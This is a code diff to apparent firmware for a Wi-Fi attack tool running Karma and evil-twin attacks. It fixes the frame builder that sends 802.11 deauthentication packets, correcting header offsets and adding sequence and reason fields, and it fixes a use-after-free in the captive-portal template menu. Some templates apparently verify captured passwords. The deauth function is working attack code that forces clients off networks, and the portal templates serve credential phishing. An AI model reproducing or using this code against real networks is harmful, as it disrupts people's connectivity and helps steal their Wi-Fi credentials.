@@ -2,7 +2,9 @@
 #include "karma_attack.h"
 #include "FS.h"
 #include "core/display.h"
+#include "core/logging/nzlog.h"
 #include "core/mykeyboard.h"
+#include "core/net_utils.h"
 #include "core/sd_functions.h"
 #include "core/wifi/webInterface.h"
 #include "core/wifi/wifi_common.h"
@@ -1374,27 +1376,24 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
     if (activePortalChannel > 0 && channel != activePortalChannel) { return; }
 
     uint8_t deauthPacket[26] = {0};
-    deauthPacket[0] = 0xC0;
+    deauthPacket[0] = 0xC0; // deauthentication
     deauthPacket[1] = 0x00;
-    if (broadcast) memset(&deauthPacket[2], 0xFF, 6);
-    else
-        sscanf(
-            mac.c_str(),
-            "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-            &deauthPacket[2],
-            &deauthPacket[3],
-            &deauthPacket[4],
-            &deauthPacket[5],
-            &deauthPacket[6],
-            &deauthPacket[7]
-        );
-    memcpy(&deauthPacket[8], currentBSSID, 6);
-    memcpy(&deauthPacket[14], currentBSSID, 6);
-    deauthPacket[20] = 0x00;
-    deauthPacket[21] = 0x00;
-    deauthPacket[22] = 0x01;
-    deauthPacket[23] = 0x00;
-    if (sendRawFrameOnAp(deauthPacket, 24, channel)) { deauthPacketsSent++; }
+    // 802.11 header: addr1(destination) at 4, addr2(source) at 10, addr3(BSSID) at 16.
+    if (broadcast) {
+        memset(&deauthPacket[4], 0xFF, 6);
+    } else {
+        uint8_t client[6];
+        if (!stringToMACChecked(mac, client)) { return; }
+        memcpy(&deauthPacket[4], client, 6);
+    }
+    memcpy(&deauthPacket[10], currentBSSID, 6);
+    memcpy(&deauthPacket[16], currentBSSID, 6);
+    uint16_t seq = (uint16_t)random(0, 4096) << 4;
+    deauthPacket[22] = seq & 0xFF;
+    deauthPacket[23] = (seq >> 8) & 0xFF;
+    deauthPacket[24] = 0x07; // reason: class 3 frame received from nonassociated STA
+    deauthPacket[25] = 0x00;
+    if (sendRawFrameOnAp(deauthPacket, 26, channel)) { deauthPacketsSent++; }
 }
 
 void sendBeaconFrames() {
@@ -1865,15 +1864,19 @@ bool selectPortalTemplate(bool isInitialSetup) {
     drawMainBorderWithTitle("SELECT TEMPLATE");
     std::vector<Option> templateOptions;
     for (const auto &tmpl : portalTemplates) {
-        String displayName = tmpl.name;
-        if (tmpl.isDefault) displayName = "[D] " + displayName;
-        if (tmpl.verifyPassword) displayName += " (verify)";
-        templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
-                                       selectedTemplate = tmpl;
+        // Copy the template into the closure. The old code captured a
+        // reference into portalTemplates, but "Reload Templates" clears and
+        // rebuilds that vector while this menu is still alive -> use-after-free.
+        PortalTemplate tmplCopy = tmpl;
+        String displayName = tmplCopy.name;
+        if (tmplCopy.isDefault) displayName = "[D] " + displayName;
+        if (tmplCopy.verifyPassword) displayName += " (verify)";
+        templateOptions.push_back({displayName.c_str(), [=]() {
+                                       selectedTemplate = tmplCopy;
                                        templateSelected = true;
                                        if (isInitialSetup) {
                                            drawMainBorderWithTitle("KARMA SETUP");
-                                           displayTextLine("Selected: " + tmpl.name);
+                                           displayTextLine("Selected: " + tmplCopy.name);
                                            delay(1000);
                                        }
                                    }});
